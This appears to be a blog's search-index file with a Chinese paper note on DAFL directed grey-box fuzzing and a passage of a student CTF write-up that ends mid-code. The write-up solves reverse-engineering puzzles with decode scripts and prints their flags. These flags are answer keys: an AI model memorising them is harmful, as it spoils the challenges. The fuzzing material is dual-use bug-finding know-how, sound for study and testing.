<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>【论文阅读】DAFL: Directed Grey-box Fuzzing guided by Data Dependency </title>
    <link href="/2024/05/20/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/"/>
    <url>/2024/05/20/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/</url>
    
    <content type="html"><![CDATA[<h1 id="1-Abstract"><a href="#1-Abstract" class="headerlink" title="1. Abstract"></a>1. Abstract</h1><ul><li><p>现有的定向灰盒模糊器不能很好的适应对比较复杂的程序进行fuzz</p></li><li><p>主要的原因：</p></li><li><ul><li>现有的种子距离机制不能很好地处理具有复杂控制结构的程序。</li><li>传统的覆盖反馈并不总是为到达目标程序点提供有意义的指导</li></ul></li><li><p>本文提出的DAFL选择与目标位置相关的代码部分，并仅从这些部分获得覆盖率反馈，并考虑到程序执行的数据流语义计算的种子距离来代替现有的种子距离机制。</p></li><li><p>得到优化，在41个真实世界的bug中：</p></li><li><ul><li>与现有的AFL、AFLGo、WindRanger和Beacon方法相比，在给定的时间能多发现4个、6个、9个和5个bug。</li><li>比较median TTE，DAFL比AFLGo, WindRanger和Beacon等3种最先进的定向fuzzers平均快至少4.99倍。</li></ul></li></ul><h1 id="2-Introduction"><a href="#2-Introduction" class="headerlink" title="2. Introduction"></a>2. Introduction</h1><h2 id="2-1-DGF（directed-grey-box-fuzzing）"><a href="#2-1-DGF（directed-grey-box-fuzzing）" class="headerlink" title="2.1. DGF（directed grey-box fuzzing）"></a>2.1. DGF（directed grey-box fuzzing）</h2><h3 id="2-1-1-Why-DGF"><a href="#2-1-1-Why-DGF" class="headerlink" title="2.1.1. Why DGF"></a>2.1.1. Why DGF</h3><ul><li>当前的灰盒测试大多数是使用覆盖率进行引导的，即在有限的时间内覆盖尽可能多的路径。  </li><li>但是，并不应该将程序中所有的代码同等或者说等权重的对待，因为模糊测试工具覆盖的绝大多数代码都是不包含 bug 的。  </li><li>而且在实际的应用过程中，想要覆盖完整的代码分布，是十分困难的或者说是完全不可能的。</li></ul><p>为了克服这些问题， 提出了导向型模糊测试（DGF）</p><h3 id="2-1-2-DGF-Overview"><a href="#2-1-2-DGF-Overview" class="headerlink" title="2.1.2. DGF Overview"></a>2.1.2. DGF Overview</h3><ul><li>DGF : 导向型模糊测试就是针对程序中有可能会出现bug的特定目标位置上，想法设法到达这些位置</li><li>DGF 方法要解决的关键问题：</li></ul><ol><li><ol><li>引入种子和目标 target 之间的距离这个概念，选择距离目标位置更近的种子给予更多的变异机会，来引导灰盒模糊测试到达目标位置。</li><li>也就是优化生成的种子和目标位置之间的距离，导向型灰盒模糊测试将之前的可达性问题转换成了一个优化问题。  </li><li>能够发现，整个DGF问题的关键之一就是如何定义种子和目标位置之间的距离，来进行优化。</li></ol></li></ol><ul><li>因此DGF当前主要基于两个关键机制:</li></ul><ol><li><ol><li>DGF 可以支持由无向灰盒 fuzzing 中的覆盖率引导来进化测试用例  </li><li>DGF 通过 CFG（控制流图）中的执行节点和目标节点的距离来衡量每个测试用例的优先级，并排序，从而为 fuzzer 提供到达目标程序点的指导</li></ol></li></ol><h2 id="2-2-Challenge-and-Our-Solution"><a href="#2-2-Challenge-and-Our-Solution" class="headerlink" title="2.2. Challenge and Our Solution"></a>2.2. Challenge and Our Solution</h2><h3 id="2-2-1-Challenge"><a href="#2-2-1-Challenge" class="headerlink" title="2.2.1. Challenge"></a>2.2.1. Challenge</h3><ul><li>Challenge 1：全局性的代码覆盖率会给DGF带来负面影响。</li></ul><ol><li><ol><li>只要fuzzers可以获得更多的覆盖范围，他们就可能被引导到与目标执行无关的路径上。</li><li>当目标程序很大时，这个问题会变得更糟， 覆盖率引导的方向会容易和目标程序点背离。</li><li>Beacon 是最先尝试解决该问题的工作，它计算达到目标的最弱先决条件，并修改程序，但是这个方法在程序有复杂循环时不起效。</li></ol></li></ol><ul><li>Challenge 2： 当程序具有复杂的控制结构时，现存的种子距离算法表现不佳。</li></ul><ol><li><ol><li>大多数现有的定向灰盒模糊器，都是通过考虑CFG中所有已执行的节点来计算一个测试用例的种子距离，但尤其当程序较大时，执行节点链的长度会很长，会包含很多和目标程序点语义不相关的节点  </li><li>WindRanger 是第一个使用偏差基本块（DBBs）来解决偏差问题的工作，但是仍然在很多结构中，尤其在循环结构中不是一个好的形式</li></ol></li></ol><h3 id="2-2-2-solution"><a href="#2-2-2-solution" class="headerlink" title="2.2.2. solution"></a>2.2.2. solution</h3><ul><li>selective coverage instrumentation：选择性覆盖检测通过仅从与目标执行相关的代码部分收集代码覆盖信息来减少负面反馈。与Beacon不同，这种非剪枝的设计选择有助于减轻我们分析的稳健性要求，使分析适用于更复杂的循环程序。</li><li>semantic relevance scoring：与现有方法相比，语义关联评分提供了一种更直观的精确计算种子距离的方法。用DUG代替CFG，考虑Def-Use Graph (DUG)，CFG中的复杂控制结构(如循环)通常可以消除。</li></ul><p>提出了DAFL，一种新的定向灰盒模糊器来解决这两个挑战</p><p>•我们提出了选择性覆盖工具，这是一种测量DGF代码覆盖的新方法。</p><p>•我们设计了语义相关性评分，这是一种有效调度DGF种子的新技术。</p><p>进行实验结果表明，现有的模糊器有很大的改进。特别地，我们对先前文献中使用的41个现实世界中的错误进行了DAFL评估，并表明DAFL能够比现有的定向模糊器更快地重现错误。</p><h1 id="3-Motivation"><a href="#3-Motivation" class="headerlink" title="3. Motivation"></a>3. Motivation</h1><h2 id="CVE-2017-7578"><a href="#CVE-2017-7578" class="headerlink" title="CVE-2017-7578"></a>CVE-2017-7578</h2><ul><li><p>大概一段 C 语言的数组越界错误，用户可以输入任意大小的整数作为索引，而一个易受攻击的函数没有验证输入的索引。</p></li><li><p>到达这个易受攻击的函数的路径只有一条，但是从 main 出发经过这条路径的同时，中途会有很多分岔路径，会大大分散测试用例的能量分配，导致误导</p></li></ul><img src="/../../images/【论文阅读】DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715861330868-04a4de39-1687-4427-9148-03f6a8e129e8.png" alt="img" style="zoom: 67%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">for</span>()&#123;<br>    <span class="hljs-keyword">if</span>(条件a)<br>        <span class="hljs-keyword">break</span>;<span class="hljs-comment">//seed a</span><br>    #<span class="hljs-meta">#code##</span><br>    <span class="hljs-keyword">if</span>(条件b)&#123;<br>        <span class="hljs-keyword">if</span>(b1)<br>            <span class="hljs-keyword">break</span>;<span class="hljs-comment">//seed b</span><br>        <span class="hljs-keyword">else</span><br>            #<span class="hljs-meta">#code##</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        blockParse(f, type)<span class="hljs-comment">//crash function</span><br>    &#125;<br>    <br></code></pre></td></tr></table></figure><h2 id="3-1-Challenge-1-Negative-Feedback"><a href="#3-1-Challenge-1-Negative-Feedback" class="headerlink" title="3.1. Challenge 1: Negative Feedback"></a>3.1. Challenge 1: Negative Feedback</h2><h3 id="3-1-1-NegativeCoverage"><a href="#3-1-1-NegativeCoverage" class="headerlink" title="3.1.1. NegativeCoverage"></a>3.1.1. NegativeCoverage</h3><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715756631777-cb7e6d0b-8e4c-4a22-93f3-16432e28c2c0.png" alt="img"></p><p><strong>一般性的的coverage设计会使fuzzer其他function上浪费能量</strong></p><p>虽然blockParse可以根据用户输入调用80多个不同的函数，但只有一个函数，即parseSWF_DEFINEMORPHSHAPE，与目标bug相关。然而，现有的定向模糊器将大量的精力分配给了探索这些新的(但不相关的)功能的测试用例，从而显著地误导了它们。</p><h3 id="3-1-2-Beacon"><a href="#3-1-2-Beacon" class="headerlink" title="3.1.2. Beacon"></a>3.1.2. Beacon</h3><p>Beacon是一种DGF，通过<strong>修剪无法到达目标的不可行的路径</strong>来缓解这个问题，但它不足以处理像这个例子这样的复杂程序。理想情况下，Beacon应该生成达到目标bug的最弱前提条件。然而，在实践中，由于<strong>main</strong>和<strong>blockParse这样的</strong>函数的控制结构复杂，Beacon无法从它们推断出任何前提条件。</p><h2 id="3-2-Challenge-2-Misleading-Distance-Metrics"><a href="#3-2-Challenge-2-Misleading-Distance-Metrics" class="headerlink" title="3.2. Challenge 2: Misleading Distance Metrics"></a>3.2. Challenge 2: Misleading Distance Metrics</h2><p>当前的DGF通过根据测试用例在CFG上与目标的语法距离对其进行优先级排序来指导搜索，但是这种语法度量通常不能反映目标错误的语义方面。</p><p> <img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715862590069-bd037d25-aaad-4566-962f-f7941c406fca.png" alt="img"></p><h3 id="3-2-1-CFG-Based-AFLGO"><a href="#3-2-1-CFG-Based-AFLGO" class="headerlink" title="3.2.1. CFG-Based AFLGO"></a>3.2.1. CFG-Based AFLGO</h3><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715931042010-a1ae930d-27ef-4dc7-bdeb-cd328eb3e4db.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715918949378-adb66fbf-1c7c-499f-9024-cf0423bb085e.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715918974413-fba49a9b-571a-4bb4-b34c-e6a7b60f040b.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715919056557-810232cc-c2dd-4738-94c0-ecfccde7721f.png" alt="img"></p><h3 id="3-2-2-DDB-Based-WindRanger"><a href="#3-2-2-DDB-Based-WindRanger" class="headerlink" title="3.2.2. DDB-Based WindRanger"></a>3.2.2. DDB-Based WindRanger</h3><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715919215770-32a38fe0-1186-49b1-ad97-1307f943778c.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715919229024-293e342c-dc39-4877-b443-ad49b8647109.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715919249872-fb3315c7-18a2-4a9f-8bf2-f6473390ef42.png" alt="img"></p><h1 id="4-Overview-Design"><a href="#4-Overview-Design" class="headerlink" title="4. Overview&amp;Design"></a>4. Overview&amp;Design</h1><h2 id="4-1-DUG（def-use-gragh"><a href="#4-1-DUG（def-use-gragh" class="headerlink" title="4.1. DUG（def-use gragh"></a>4.1. DUG（def-use gragh</h2><ul><li>DAFL首先使用数据依赖关系静态地分析P和片P对t的数据依赖关系。函数返回一个元组(G;F)</li><li>focus on value transfers来完成DUG的构建</li><li><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715925248937-98afc9bd-de91-4063-aa6b-ae537b45644e.png" alt="img"></li></ul><ol><li><ol><li>G是根据t的数据定义得到的一个DUG</li><li>F是G所涵盖的一组函数,即Selective Coverage。</li></ol></li></ol><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715922708530-6f10a31b-4539-48d5-a9bc-44e54814a2f8.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715926311853-a08368ef-49a3-4e2d-8807-c8d5d78d9ec2.png" alt="img"></p><ul><li><p>fuzzer从目标位置开始遍历程序，使用 Thin Slicing收集所有依赖语句,生成DUG, </p></li><li><ul><li>关于 Thin Slicing：将指针解引用了（去除指针带来的多余变量),</li><li>减小切片（理解为数据依赖的一个 backward 的数据流图）的大小，从而为定向 fuzzing 提供更有效率的指导</li><li><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715925357449-22ba6c78-822a-4577-a479-868918d486a1.png" alt="img"></li></ul></li><li><p>原因：DUG 可以自动忽略掉很多不相关的节点，即留下来的只有有数据依赖关系的节点</p></li><li><p>即使对应的 CFG 有循环，DUG 也不会有循环（只要没有循环数据依赖性)</p></li></ul><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715922760209-c25a456f-3fdb-4a9b-956f-09f7f83163d8.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715922776465-1ef9371d-8fc5-4dc0-88a3-910d768cdd42.png" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715922792632-9304f23e-2b68-443f-a61a-91cc659f75f7.png" alt="img"></p><h2 id="4-4-Overview"><a href="#4-4-Overview" class="headerlink" title="4.4. Overview"></a>4.4. Overview</h2><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715920932358-1f8975c7-a009-4fe1-a58a-f033931f8a94.webp" alt="img"></p><p><img src="/../../images/%E3%80%90%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB%E3%80%91DAFL-Directed-Grey-box-Fuzzing-guided-by-Data-Dependency/1715925248937-98afc9bd-de91-4063-aa6b-ae537b45644e-1716212241704-19.png" alt="img"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SWJTUCTF2023</title>
    <link href="/2023/12/10/SWJTUCTF2023/"/>
    <url>/2023/12/10/SWJTUCTF2023/</url>
    
    <content type="html"><![CDATA[<h1 id="SWJTUCTF"><a href="#SWJTUCTF" class="headerlink" title="SWJTUCTF"></a>SWJTUCTF</h1><p><em>一次新生赛，算高强度打了5天，好累好累好累破防破防破防玉玉玉玉玉玉</em></p><p><em>题的质量真的不辍辛苦各位同学前辈了</em></p><p><strong>菜 就多练【红豆红豆】，权且记录一下吧</strong></p><p><em><strong>by Nobu</strong></em></p><hr><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="FreeVSCode"><a href="#FreeVSCode" class="headerlink" title="FreeVSCode"></a>FreeVSCode</h2><p>用linux里string命令翻就好</p><h2 id="angr"><a href="#angr" class="headerlink" title="angr"></a>angr</h2><p>一开始在window装嗯折磨，换了linux里python2+virtualenvwrapper秒通······</p><p>用IDA找到avoid和find就好</p><p><img src="/../../images/SWJTUCTF2023/wp.png" alt="wp"></p><h2 id="Maze"><a href="#Maze" class="headerlink" title="Maze"></a>Maze</h2><p>标准迷宫题</p><p><img src="/../../images/SWJTUCTF2023/image-20231212162338421.png" alt="image-20231212162338421"></p><p>很清晰，由v8 v7判断出是左上到右下，dump出maze，走迷宫</p><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs clean">#ooooooooo<br>#ooo###ooo<br>#####o#ooo<br>#ooo#o#ooo<br>#o#ooo#ooo<br>#o#o####oo<br>o##o#o#ooo<br>#o#o#o#ooo<br>#o#o#ooooo<br>oo########<br><br>flag&#123;ssddddwddssssaassssddddd&#125;<br></code></pre></td></tr></table></figure><h2 id="EZ-Pyinstaller"><a href="#EZ-Pyinstaller" class="headerlink" title="EZ  Pyinstaller"></a>EZ  Pyinstaller</h2><p>用pyinstxtractor反编译exe，在线依次反编译pyc</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment"># visit https://tool.lu/pyc/ for more information</span><br><span class="hljs-comment"># Version: Python 3.11</span><br><br><span class="hljs-attribute">correct</span> = b&#x27;fmcj%<span class="hljs-number">7</span>f~k;PhZ%<span class="hljs-number">84</span>u[%<span class="hljs-number">81</span>cD&#125;CF%<span class="hljs-number">86</span>t&#125;\\fL%<span class="hljs-number">8</span>cO%<span class="hljs-number">90</span>P%<span class="hljs-number">82</span>~%<span class="hljs-number">88</span>%<span class="hljs-number">96</span>iV%<span class="hljs-number">83</span>%<span class="hljs-number">8</span>bW%<span class="hljs-number">93</span>[%a6&#x27;<br><span class="hljs-attribute">print</span>(&#x27;Welcome to the SWJTU CTF!&#x27;)<br><span class="hljs-attribute">print</span>(&#x27;Please input the flag:&#x27;)<br><span class="hljs-attribute">flag</span> = input()<br><span class="hljs-attribute">s</span> = b&#x27;&#x27;<br><span class="hljs-comment"># WARNING: Decompyle incomplete</span><br></code></pre></td></tr></table></figure><p>只有这些，不过注意到fmcj就是flag依次移index位，调整一下</p><figure class="highlight axapta"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs axapta">hex_array = [<span class="hljs-string">&#x27;66&#x27;</span>, <span class="hljs-string">&#x27;6d&#x27;</span>, <span class="hljs-string">&#x27;63&#x27;</span>, <span class="hljs-string">&#x27;6a&#x27;</span>, <span class="hljs-string">&#x27;7f&#x27;</span>, <span class="hljs-string">&#x27;7e&#x27;</span>, <span class="hljs-string">&#x27;6b&#x27;</span>, <span class="hljs-string">&#x27;3b&#x27;</span>, <span class="hljs-string">&#x27;50&#x27;</span>, <span class="hljs-string">&#x27;68&#x27;</span>, <span class="hljs-string">&#x27;5a&#x27;</span>, <span class="hljs-string">&#x27;84&#x27;</span>, <span class="hljs-string">&#x27;75&#x27;</span>, <span class="hljs-string">&#x27;5b&#x27;</span>, <span class="hljs-string">&#x27;81&#x27;</span>, <span class="hljs-string">&#x27;63&#x27;</span>, <span class="hljs-string">&#x27;44&#x27;</span>, <span class="hljs-string">&#x27;7d&#x27;</span>, <span class="hljs-string">&#x27;43&#x27;</span>, <span class="hljs-string">&#x27;46&#x27;</span>, <span class="hljs-string">&#x27;86&#x27;</span>, <span class="hljs-string">&#x27;74&#x27;</span>, <span class="hljs-string">&#x27;7d&#x27;</span>, <span class="hljs-string">&#x27;5c&#x27;</span>, <span class="hljs-string">&#x27;66&#x27;</span>, <span class="hljs-string">&#x27;4c&#x27;</span>, <span class="hljs-string">&#x27;8c&#x27;</span>, <span class="hljs-string">&#x27;4f&#x27;</span>, <span class="hljs-string">&#x27;90&#x27;</span>, <span class="hljs-string">&#x27;50&#x27;</span>, <span class="hljs-string">&#x27;82&#x27;</span>, <span class="hljs-string">&#x27;7e&#x27;</span>, <span class="hljs-string">&#x27;88&#x27;</span>, <span class="hljs-string">&#x27;96&#x27;</span>, <span class="hljs-string">&#x27;69&#x27;</span>, <span class="hljs-string">&#x27;56&#x27;</span>, <span class="hljs-string">&#x27;83&#x27;</span>, <span class="hljs-string">&#x27;8b&#x27;</span>, <span class="hljs-string">&#x27;57&#x27;</span>, <span class="hljs-string">&#x27;93&#x27;</span>, <span class="hljs-string">&#x27;5b&#x27;</span>, <span class="hljs-string">&#x27;a6&#x27;</span>]<br><br><span class="hljs-meta"># 将十六进制转换为整数</span><br>int_array = [<span class="hljs-built_in">int</span>(hex_value, <span class="hljs-number">16</span>) <span class="hljs-keyword">for</span> hex_value <span class="hljs-keyword">in</span> hex_array]<br><br><span class="hljs-meta"># 减去对应的位置值</span><br>result = [value - <span class="hljs-keyword">index</span> <span class="hljs-keyword">for</span> <span class="hljs-keyword">index</span>, value <span class="hljs-keyword">in</span> enumerate(int_array)]<br><br><span class="hljs-meta"># 将结果转换为ASCII字符</span><br>ascii_result = <span class="hljs-string">&#x27;&#x27;</span>.<span class="hljs-keyword">join</span>([chr(value) <span class="hljs-keyword">for</span> value <span class="hljs-keyword">in</span> result])<br><br><span class="hljs-keyword">print</span>(ascii_result)<br><br>flag&#123;ye4H_PyiNsT4l13r_gEN3r4t3d_huG3_f1l3&#125;<br></code></pre></td></tr></table></figure><p>谢谢GPT···</p><h2 id="EZ-WASM"><a href="#EZ-WASM" class="headerlink" title="EZ WASM"></a>EZ WASM</h2><p>[主要参考了这个]: <a href="https://xz.aliyun.com/t/5170">https://xz.aliyun.com/t/5170</a>“here”</p><p><a href="https://xz.aliyun.com/t/5170">https://xz.aliyun.com/t/5170</a></p><p>IDA反编译o文件</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs smali">v3 = a1;<span class="hljs-built_in"></span><br><span class="hljs-built_in">if </span>( ++wasm_rt_call_stack_depth &gt; 0x1F4u )<br>  wasm_rt_trap(7<span class="hljs-class">LL);</span><br>v4 = 0;<br>do<br>&#123;<br>  v5 = i32_load8_u((__int64)&amp;w2c_memory, v3);<br>  i32_store8((__int64)&amp;w2c_memory, v3++, v4++ ^ v5);<br>&#125;<br></code></pre></td></tr></table></figure><p>逻辑简单，correct在页面上</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">def</span> w2c_decrypt(<span class="hljs-meta">data</span>):<br>    result = []<br>    <span class="hljs-built_in">v3</span> = <span class="hljs-number">0</span><br><br>    for <span class="hljs-built_in">a1</span> in range(len(<span class="hljs-meta">data</span>)):<br>        <span class="hljs-built_in">v5</span> = <span class="hljs-meta">data</span>[<span class="hljs-built_in">a1</span>]<br>        result.append(<span class="hljs-built_in">v3</span> ^ <span class="hljs-built_in">v5</span>)<br>        <span class="hljs-built_in">v3</span> += <span class="hljs-number">1</span><br><br>    return bytes(result).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br><br><span class="hljs-symbol">encrypted_data</span> = [<br>    <span class="hljs-number">102</span>, <span class="hljs-number">109</span>, <span class="hljs-number">99</span>, <span class="hljs-number">100</span>, <span class="hljs-number">127</span>, <span class="hljs-number">114</span>, <span class="hljs-number">50</span>, <span class="hljs-number">116</span>, <span class="hljs-number">101</span>, <span class="hljs-number">86</span>, <span class="hljs-number">59</span>, <span class="hljs-number">120</span>, <span class="hljs-number">83</span>, <span class="hljs-number">91</span>, <span class="hljs-number">61</span>, <span class="hljs-number">125</span>,<br>    <span class="hljs-number">105</span>, <span class="hljs-number">78</span>, <span class="hljs-number">38</span>, <span class="hljs-number">126</span>, <span class="hljs-number">32</span>, <span class="hljs-number">111</span>, <span class="hljs-number">39</span>, <span class="hljs-number">121</span>, <span class="hljs-number">127</span>, <span class="hljs-number">100</span>,<br>]<br><br><span class="hljs-symbol">decrypted_string</span> = w2c_decrypt(encrypted_data)<br><span class="hljs-symbol">print</span>(decrypted_string)<br><br><span class="hljs-symbol">flag</span>&#123;w4sm_1s_V3ry_4m4z1ng&#125;<br></code></pre></td></tr></table></figure><h2 id="Kirikiri"><a href="#Kirikiri" class="headerlink" title="Kirikiri"></a>Kirikiri</h2><p>主要参考了geekgame23的一类</p><p>用TLS用incontextof失败，试着用hash爆，明明都很清晰了，但是因为自己点过几次也计入了存档，没意识到这个已知以为是爆错了找错了，浪费半天···</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> more_itertools <span class="hljs-keyword">import</span> distinct_permutations <span class="hljs-keyword">as</span> idp<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cal_hash</span>(<span class="hljs-params">p</span>):<br>    <span class="hljs-built_in">hash</span> = <span class="hljs-number">1337</span><br>    <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> p:<br>        <span class="hljs-keyword">if</span> c == <span class="hljs-string">&#x27;a&#x27;</span>:<br>            <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> * <span class="hljs-number">13337</span> + <span class="hljs-number">11</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;i&#x27;</span>:<br>            <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> * <span class="hljs-number">13337</span> + <span class="hljs-number">22</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;u&#x27;</span>:<br>            <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> * <span class="hljs-number">13337</span> + <span class="hljs-number">33</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;e&#x27;</span>:<br>            <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> * <span class="hljs-number">13337</span> + <span class="hljs-number">44</span><br>        <span class="hljs-keyword">elif</span> c == <span class="hljs-string">&#x27;o&#x27;</span>:<br>            <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> * <span class="hljs-number">13337</span> + <span class="hljs-number">55</span><br>        <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> % <span class="hljs-number">11451419</span><br>    <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> * <span class="hljs-number">13337</span> + <span class="hljs-number">66</span><br>    <span class="hljs-built_in">hash</span> = <span class="hljs-built_in">hash</span> % <span class="hljs-number">11451419</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">hash</span><br><br><span class="hljs-keyword">for</span> cnt, p <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(idp(<span class="hljs-string">&#x27;aaaaaeeiiiuu&#x27;</span>)):<br>    <span class="hljs-built_in">hash</span> = cal_hash(p)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">hash</span> == <span class="hljs-number">8927687</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Solution:&quot;</span>, <span class="hljs-string">&quot;&quot;</span>.join(p))<br>        <span class="hljs-comment"># break</span><br> <br>Solution: aiaueiauaiea<br></code></pre></td></tr></table></figure><h2 id="Are-you-good-at-math"><a href="#Are-you-good-at-math" class="headerlink" title="Are you good at math?"></a>Are you good at math?</h2><p>一串复杂运算，用z3约束器，直接编写脚本就好</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 